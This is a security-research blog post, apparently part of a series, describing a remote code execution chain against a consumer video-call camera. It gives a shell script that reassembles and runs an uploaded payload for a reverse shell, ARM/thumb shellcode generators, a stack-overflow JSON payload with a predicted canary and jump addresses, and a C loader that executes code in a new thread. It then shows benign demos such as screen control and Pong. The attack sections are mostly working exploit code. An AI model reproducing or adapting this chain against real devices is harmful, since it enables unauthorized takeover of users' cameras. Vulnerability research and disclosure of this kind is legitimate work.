# SD Card File Write + *iperf* Binary

## Getting a Reverse Shell

From the research in the third blog of this channel, we now have both a bug that can write files to the SD card, and a bug that results in execution of a binary from the SD card. Therefore, we now have a way to get remote code execution (provided there is an SD card inserted)! However, the **iperf** file cannot be more than *0xc000*, and my reverse shell and *gdb* payloads are roughly 10x larger (thanks static linking).

At the time of the discovery of these bugs, I was still having to take the SD card out of the camera, flash the **iperf** binary I wanted to run as well as a **gdbserver-static** binary - safe to say I was getting very sick of this. So lets put that method to rest and work out how I can get the files on the device remotely and execute them. 

I remembered that **iperf** doesn't have to be a binary and that it can also be a */bin/ash* script, so all I have to do is send over small chunks of the file with the file write primitive (i.e. split the file into parts and write each part into a new file). Then once all of the parts are sent, I can simply recombine them into the full binary, make it executable, and run it from the script!

Here is the script I wrote to do this:

```
-bash
#!/bin/ash

# check if part exists
if [ ! -f /var/tmp/mmcblock0/iperf/part0 ]; then
	echo "Error: No part files found"
	exit 1
fi

# remove existing payload if already exists
rm -f /var/tmp/mmcblock0/iperf/payload

# init counter
i=0

# build the file from parts
while [ -f "/var/tmp/mmcblock0/iperf/part$i" ]; do
	cat "/var/tmp/mmcblock0/iperf/part$i" >> /var/tmp/mmcblock0/iperf/payload
	rm "/var/tmp/mmcblock0/iperf/part$i"
	i=$((i+1))
done

chmod +x /var/tmp/mmcblock0/iperf/payload

/var/tmp/mmcblock0/iperf/payload &
```

So all we need to do is the following:
1. Plug an SD card into the device
2. Send over the **iperf** script above with the file write
3. Use the file write to send chunks of the file into **part** files
4. Use the *RunIperfTest* command to execute the *ash* script
5. This recombines the parts into the full payload, makes it executable and runs it! 
6. We now have a fully remote reverse shell on the device

# Canary Weakness + Stack Overflow

Now onto the memory corruption! In the last blog, we discovered that they are actually using the address of the stack canary as the canary (meaning we can predict it 100% of the time), and we also found a stack overflow that allowed us to fix the canary while overwriting the register contents it is supposed to protect. This gave us control of pc, but how can we get full remote code execution with this?

## Memory Map

We need to get some code somewhere, lets take a look at the memory map:

```

A few things to take from this:
- They are clearly using the weak Linux ASLR that only jumbles the location of the stack and shared objects which is handy
- The stack, heap, and global memory regions are both writeable and executable? That is very brave!

## HTTP Server Buffers

While taking a look at the HTTP server contents and looking for bugs, I remembered seeing lots of global buffers that data gets copied into. If you think back to the third blog in this channel, the integer underflow was impacting a copy into a global memory buffer for the username (and there was also a buffer for the password). Both of these are 64 bytes and we know that they are executable, so these will definitely be useful.

I also remembered seeing that a pointer to the main buffer that receives the raw HTTP request is stored at a fixed location in memory. This buffer is a *0x20000* allocation on the heap, so if we could execute some code in there we should have plenty of room to do some interesting things!

![http_buffer_allocation.png](/assets/images/video_call_camera_p5/http_buffer_allocation.png)

### Plan

Due to the lack of mitigations, it was quite easy to come up with a plan to get execution with the buffers I mentioned above:

1. Send a HTTP request that contains the following:
  - The specified 'username' is a single ARM instruction that branches to the contents of a register which is set in the next request (+1 because we want thumb instructions to save space and avoid null characters)
  - The specified 'password' is a small thumb payload that loads the address of the pointer to the large http buffer, increments it as to jump to code after the main HTTP contents, and branches to this location
  - After the main HTTP contents is our stage 1 payload
2. Next, trigger the stack overflow, fix the canary, set one of the registers to be the location of the 'username' buffer so that it can be jumped into (which then branches to thumb instructions, and jumps to main stage 1 payload in large buffer)

Here are the functions that generate the username and password buffer payloads:

```
-python
def generate_jump_to_thumb(password_addr):   
    # Create the shellcode
    instructions = asm(f'''
        bx r7
    ''', arch='arm', endian='little')
    
    return instructions
```

```
-python
def generate_thumb_pointer_jump(ptr_addr, base_addr=0):   
    # Create the shellcode
    instructions = asm(f'''
        ldr r3, [pc, #0x8]  /* Load address of pointer from literal pool */
        ldr r4, [pc, #0xc]  /* load key */
        eors r3, r4         /* get original pointer */
        ldr r3, [r3]        /* Load value from the pointer */
        adds r3, #0x50      /* add offset */
        bx r3               /* Jump to the loaded address */
    ''', arch='thumb', endian='little')

    literal_pool = p32(ptr_addr ^ 0xffffffff) + p32(0xffffffff)
    
    return instructions + literal_pool
```

And here is the JSON payload that triggers the overflow, it isn't pretty but it works:

```
json_byte_payload = b'{"Name": "FTP", "FTP": {"Server": {"Name": "' + 15* b"a" + 119 * b"b" + b'.' +119 * b"c" + b'.' + 119 * b"d" + b'.' + 119 * b"e" + b'.'
json_byte_payload += b'....'
json_byte_payload += b'\x30\xb2\x65..' # canary
json_byte_payload += b'a'*15
json_byte_payload += b'\x1d\x8b\x66..' # address of password buffer containing thumb instructions (therefore add 1)
json_byte_payload += b'a'*15 
json_byte_payload += b'\x64\x8b\x66..' # address of username buffer we jump to containing arm instructions
json_byte_payload += b'a'*10
json_byte_payload += b'", "Port": 9898, "UserName": "aaaaaaa", "Password": "bbbbbbb"}}, "SessionID": "0x0001869f"}'
```

### Testing

Setting the contents of stage 1 to be an invalid instruction (*0xffffffff*) we observe the following crash:

```
Thread 42 "NetIPManager" received signal SIGILL, Illegal instruction.

```

Nice! We can see the *0xffffffff* we put to trigger the crash, and some A's I placed after it.

![nice.webp](/assets/images/video_call_camera_p5/nice.webp)

## Fixing Up Execution

I expected this to be a bit of a pain to fix, mainly because a lot of my exploits ended up somehow destroying the stack (even the heap overflow from the *Action Camera* channel!). Lets take a quick look at the stack frame layout, and work out where the stack pointer is looking when we get execution.

![stack_layout.png](/assets/images/video_call_camera_p5/stack_layout.png)

I realised that we don't actually touch the stack pointer, so we should be able to simply jump to the error condition of the function above it in the stack frame, and everything should carry on without any issues.

![fixup.png](/assets/images/video_call_camera_p5/fixup.png)

I put this code together that simply jumps to *0x41e040* to see if executing this stops the crash.

```
-python
def generate_fixup_example_payload():
    # need to jump to 0x41e040 as this is an error handler in above function
    fixup_address = 0x41e040

    instructions = asm(f'''
        ldr r5, [pc, #0x8]  /* Load address of pointer from literal pool */
        ldr r6, [pc, #0x8]  /* load key */
        eor r5, r5, r6         /* get original pointer */
        bx r5               /* Jump to the loaded address */
    ''', arch='arm', endian='little')

    literal_pool = p32(fixup_address ^ 0xffffffff) + p32(0xffffffff)

    return instructions + literal_pool
```

After replacing the *0xffffffff* insruction we executed before with these thumb instructions (remember null is a bad character, hence the XOR business in the above payload) the camera responds to the malformed request with an error code and execution continues as expected!

![payload_meme.jpeg](/assets/images/video_call_camera_p5/payload_meme.jpeg)

## Spawning a Thread

So right now, we are getting execution, and then immediately fixing up and returning to normal execution, which is no fun. Ideally, because of the watchdog issue, and to maintian normal functionality, it would be great if we could spawn a thread and run a payload there.

### Executing a C Payload

As we are executing in the large HTTP buffer, I can simply compile a C file and extract the binary to load into memory - appending it to my HTTP request to get it into memory. We can then add a couple of instructions to the fixup payload that branch to the larger payload using *blx* so that execution continues in the fixup when our payload is finished.

Here is the simple modification to the fixup function:

```
-python
def generate_fixup_example_payload():
    # need to jump to 0x41e040 as this is an error handler in above function
    fixup_address = 0x41e040

    instructions = asm(f'''
        add r3, r3, #0x40    @ Add 0x40 to r3
        blx r3               @ Branch with link to address in r3
        ldr r5, [pc, #0x8]  /* Load address of pointer from literal pool */
        ldr r6, [pc, #0x8]  /* load key */
        eor r5, r5, r6         /* get original pointer */
        bx r5               /* Jump to the loaded address */
    ''', arch='arm', endian='little')

    literal_pool = p32(fixup_address ^ 0xffffffff) + p32(0xffffffff)

    return instructions + literal_pool
```

We can use an identical method to either the *Camera* or *Action Camera* projects, so refer back to those projects for more details.

### Screen Flash Payload

As a tester, I did a bit of reversing in the binary to find something I could use to check that my C payload was executing properly. I initially was going to flash a light, but I quickly realised there isn't one on this camera, so I went with the screen instead.

I located a function which sets the brightness of the display, so that I could turn the screen on and off in a loop to indicate that my C payload is executing. Here is the code I put together:

```
-c
#include <stdint.h>

#define LibXmDvr_SpiLcd_setLuminance_ADDR 0x13008
#define SLEEP_ADDR 0x11c10

typedef int LibXmDvr_SpiLcd_setLuminance_t(uint32_t luminance);
typedef uint32_t sleep_t(uint32_t seconds);

int _start(void) {
    LibXmDvr_SpiLcd_setLuminance_t *LibXmDvr_SpiLcd_setLuminance = (LibXmDvr_SpiLcd_setLuminance_t *) LibXmDvr_SpiLcd_setLuminance_ADDR;
    sleep_t *sleep = (sleep_t*) SLEEP_ADDR;

    char flippy = 0;
    while(1){
        uint32_t new_setting;
        if (flippy == 0){
            new_setting = 0x46;
            flippy = 1;
        } else {
            new_setting = 0x0;
            flippy = 0;
        }
        LibXmDvr_SpiLcd_setLuminance(new_setting);
        sleep(1);
    }
}
```

And that worked great, but obviously as it is an infinite loop the watchdog puts the **App** process out of its misery after a while:

![flash.gif](/assets/images/video_call_camera_p5/flash.gif)

### Dispatcher Payload

So now we have a way of executing a C payload, and a payload that we can use as a tester for our dispatcher payload, lets put the dispatcher payload together!

To upload the main thread function I want to dispatch, while making it so that I don't have to modify the dispatcher payload for each file, I made a payload that loads the contents of a file on the SD card into a heap-allocated buffer. The is then executed as a function in its own thread. 

Also, for some reason standard libc functions such as **fopen**, **open**, and **read** were giving me *SIGILL* faults - I still have no idea why this was happening, but I reverse engineered how files were being used in other places in the **App** process and was able to use this method instead.

The dispatcher payload does the following:
- Opens the **/var/tmp/mmcblock0/iperf/main** file
- Reads the contents into a buffer which it allocated earlier
- Closes the file
- Creates a new thread which executes the contents of the buffer as a function (thanks executable heap!)
- Detaches the spawned thread and exits

Here is the code:

***dispatcher.h***

```

#include <stdint.h>

typedef int (*get_file_size_t)(struct file_struct*);
typedef int (*close_file_t)(struct file_struct*);

typedef void (*program_func_t)();
```

***dispatcher.c***

```
-c
#include <stdint.h>
#include "dispatcher.h"

int _start() {
    malloc_t malloc = (malloc_t) MALLOC_ADDR;
    pthread_create_t pthread_create = (pthread_create_t) PTHREAD_CREATE_ADDR;
    pthread_detach_t pthread_detach = (pthread_detach_t) PTHREAD_DETACH_ADDR;
    sleep_t sleep = (sleep_t) SLEEP_ADDR;

    create_file_struct_t create_file_struct = (create_file_struct_t) CREATE_FILE_STRUCT_ADDR;
    open_file_struct_t open_file_struct = (open_file_struct_t) OPEN_FILE_ADDR;
    read_file_t read_file = (read_file_t) READ_FILE_ADDR;
    get_file_size_t get_file_size = (get_file_size_t) GET_FILE_SIZE_ADDR;
    close_file_t close_file = (close_file_t) CLOSE_FILE_ADDR;

    struct file_struct file_desc;
    create_file_struct(&file_desc);

    int fd = open_file_struct(&file_desc, "/var/tmp/mmcblock0/iperf/main", 0x0);

    uint8_t* buffer = (uint8_t*) malloc(0x10000);

    read_file(&file_desc, buffer, 0x10000);

    close_file(&file_desc);

    pthread_t thread;
    program_func_t program = (program_func_t)buffer;
    pthread_create(&thread, 0, (void*(*)(void*))program, 0);

    pthread_detach(thread);

    return 0;
}
```

So after adding a function call to upload the **screenflash** binary to the SD card as the **main** file, we get the exact same result as above, but as execution is occuring in its own thread, it no longer crashes after a while!

# Payloads

We can now inject arbitrary code into its own thread using the stack overflow + canary bypass, lets do something interesting with it! First we need to figure out how some bits of the camera work.

## Reversing the Screen

Obviously we want to mess with the screen, as that is the entire reason I purchased the camera in the first place!

I started off by searching for display-related strings, eventually *spi* revealed the presense of these functions from an imported shared library:

![spi_functions.png](/assets/images/video_call_camera_p5/spi_functions.png)

After looking into how these functions were used, I was able to locate where the screen sizes and display buffers were being stored in memory:

![buffer_init.png](/assets/images/video_call_camera_p5/buffer_init.png)

Note that there is a nice clue what the colour format they use, **malloc(size << 1)** means they are allocating two bytes for each pixel, implying RGB 5:6:5 (or something similar) is the format of the data in the *dispTransBuffer*.

Looking at references to this function, I eventually proved that this is the buffer being used to send over SPI:

![transbuffer_send_call.png](/assets/images/video_call_camera_p5/transbuffer_send_call.png)

![screen_spi_write.png](/assets/images/video_call_camera_p5/screen_spi_write.png)

Therefore, we should be able to use this buffer (as we know where it is located) and modify it, then we can call **LibXmDvr_SpiLcd_sendData** with identical arguments to write our own data to the screen.

### Blocking Screen Updates

As we want complete control of the *dispTransBuffer*, it would be ideal if we could stop other threads from overwriting our changes. Luckily, this was quite simple after some reverse engineering. Essentially, there is a location in global memory that contains a pointer to a struct, which contains the address of the callback function to update the contents of the screen with standard stuff (time + wallpaper). 

![callback.png](/assets/images/video_call_camera_p5/callback.png)

We don't want this callback to be called, so we can simply overwrite the callback address with a *0x0*, and we will have the screen all to ourselves. Here is the code that does this:

```
-c
uint32_t weird_struct_address = 0x669bf8;
uint32_t weird_struct_ptr = *(uint32_t*) weird_struct_address;
uint32_t* weird_struct = (uint32_t*) weird_struct_ptr;
weird_struct[0xf] = 0x0;
```

### RGB

With the reversing done, it is time to take control of the screen! I chose to flash between red, green and blue to make sure my understanding of the colour format was correct:

```
-c
#include <stdint.h>

#define LibXmDvr_SpiLcd_setLuminance_ADDR 0x13008
#define LibXmDvr_SpiLcd_sendData_ADDR 0x1173c

typedef int LibXmDvr_SpiLcd_setLuminance_t(uint32_t luminance);
typedef uint32_t LibXmDvr_SpiLcd_sendData_t(uint32_t val1, uint32_t val2, uint16_t* buffer, uint32_t buffer_size);
typedef uint32_t sleep_t(uint32_t seconds);
typedef void* (*malloc_t)(uint32_t size);

int _start(void) {
    LibXmDvr_SpiLcd_setLuminance_t *LibXmDvr_SpiLcd_setLuminance = (LibXmDvr_SpiLcd_setLuminance_t *) LibXmDvr_SpiLcd_setLuminance_ADDR;
    sleep_t *sleep = (sleep_t*) SLEEP_ADDR;
    LibXmDvr_SpiLcd_sendData_t *LibXmDvr_SpiLcd_sendData = (LibXmDvr_SpiLcd_sendData_t *) LibXmDvr_SpiLcd_sendData_ADDR;
    malloc_t malloc = (malloc_t) MALLOC_ADDR;

    // overwrite draw to screen callback in struct at 

    uint32_t weird_struct_address = 0x669bf8;
    uint32_t weird_struct_ptr = *(uint32_t*) weird_struct_address;
    uint32_t* weird_struct = (uint32_t*) weird_struct_ptr;
    weird_struct[0xf] = 0x0;

    uint32_t trans_buffer_pointer_address = 0x669bd8;
    uint32_t trans_buffer_address = *(uint32_t*) trans_buffer_pointer_address;
    uint16_t* trans_buffer = (uint16_t*) trans_buffer_address;

    uint32_t height = 320;
    uint32_t width = 240;
    uint32_t buffer_size = height * width * 2;

    uint8_t color_state = 0;  // 0=red, 1=green, 2=blue
    
    while(1) {
        LibXmDvr_SpiLcd_setLuminance(0x46);
        
        // Fill buffer with current color
        for(uint32_t i = 0; i < buffer_size; i++) {
            switch(color_state) {
                case 0:  // Red
                    trans_buffer[i] = 0xF800;
                    break;
                case 1:  // Green
                    trans_buffer[i] = 0x07E0;
                    break;
                case 2:  // Blue
                    trans_buffer[i] = 0x001F;
                    break;
            }
        }
        
        LibXmDvr_SpiLcd_sendData(0xf0, 0x140, trans_buffer, buffer_size);
        sleep(1);
        
        // Cycle to next color
        color_state = (color_state + 1) % 3;
    }

    return 0;
}
```

And here is the result:

### Image Display

Now that we know the format of the *dispTransBuffer* (and we can actually write to it), we should now be able to draw images to the screen. We know that the format of the image is RGB 5:6:5, so we can use the following *ffmpeg* command to convert to the required format:

```
ffmpeg -i image.jpg -vf scale=240:320 -c:v rawvideo -pix_fmt rgb565 -f rawvideo image.raw
```

To display the image, we need to get it onto the filesystem. Our file write primitive only lets us write up to *0xc000* (which is less than *320* x *240*, meaning we cannot send a full-resolution image in one-shot). I got around this by using the same method I used for uploading the *gdbserver* - chunking it up, and using an **iperf** script to recombine everything.

All I had to do now was steal the code from the dispatcher payload that opens and reads files, copy the contents of the file into the *dispTransBuffer*, send the SPI command, and we can now write images onto the display.

## Reversing the Buttons

Ideally, we want to make our payload interactive, to do this we will need to work out how button presses are being detected by the camera.

After realising that the *hang up* button was turning the display on/off, I set a breakpoint on the **LibXmDvr_SpiLcd_setLuminance** function and traced back to the following function:

![button_press_detector.png](/assets/images/video_call_camera_p5/button_press_detector.png)

At a high level, this function is detecting if buttons have been pressed using the return value of **Libdvr_ReadADC**, we can simply clone this logic in our code to detect button presses.

### Preventing Screen Off 

As I mentioned before, I was able to find this handler because the *hang up* button causes the screen to turn on/off. This was useful, however now it keeps turning the screen on/off which is inconvenient for our payload. 

However, there is a really easy way around this:

![luminance_flag.png](/assets/images/video_call_camera_p5/luminance_flag.png)

As you can see, if we set the value stored at *0x65b420* to something that is not zero, the function no longer calls the **LibXmDvr_SpiLcd_setLuminance** function!

```
-c
uint32_t weird_flag_address = 0x65b420;
uint32_t* weird_flag_ptr = (uint32_t*) weird_flag_address;
*weird_flag_ptr = 0x1;
```

### ButtonTest

With the buttons reversed, and the normal behaviour of the buttons disabled, we can finally write some code to demonstrate where we are at:

```

    uint8_t right;
};

int _start(void) {

    uint32_t width = 240;
    uint32_t buffer_size = height * width * 2;

    uint8_t color_state = 0;  // 0=red, 1=green, 2=blue

    struct ButtonState states;
    states.left = 0;
    states.right = 0;

    int adc_val;
    uint8_t left_pressed = 0;
    uint8_t right_pressed = 0;
    
    while(1) {
        LibXmDvr_SpiLcd_setLuminance(0x46);
        adc_val = Libdvr_ReadADC(1);

        // Left button logic
        if ((adc_val >= 0x29) && (adc_val <= 0x4d)) {
            states.left = 1;
        } else if (states.left == 1) {
            states.left = 0;
        }

        // Right button logic
        if ((adc_val >= 0xb0) && (adc_val <= 0xd1)) {
            states.right = 1;
        } else if (states.right == 1) {
            states.right = 0;
        }
        
        // Fill buffer with current color
        for(uint32_t i = 0; i < buffer_size; i++) {
            if (states.left) {
                trans_buffer[i] = 0x07E0;  // Green
            } else if (states.right) {
                trans_buffer[i] = 0x001F;  // Blue
            } else {
                trans_buffer[i] = 0x0000;  // Black
            }
        }
        
        LibXmDvr_SpiLcd_sendData(0xf0, 0x140, trans_buffer, buffer_size);
    }

    return 0;
}
```

### Pong

Now we have sufficient control of the screen and buttons such that we can implement a game that uses only two buttons. As a quick PoC, here is a demonstration of a dumbed-down version of Pong running on it:

![pong.gif](/assets/images/video_call_camera_p5/pong.gif)

It is like a little arcade machine!

# Conclusion

In this blog, we chained some of the bugs we discovered in previous blogs together to create exploits that give us fully remote code execution. We spent some time reversing the camera's screen and button interface, eventually getting enough control to implement a simple interactive game that uses two buttons - Pong!
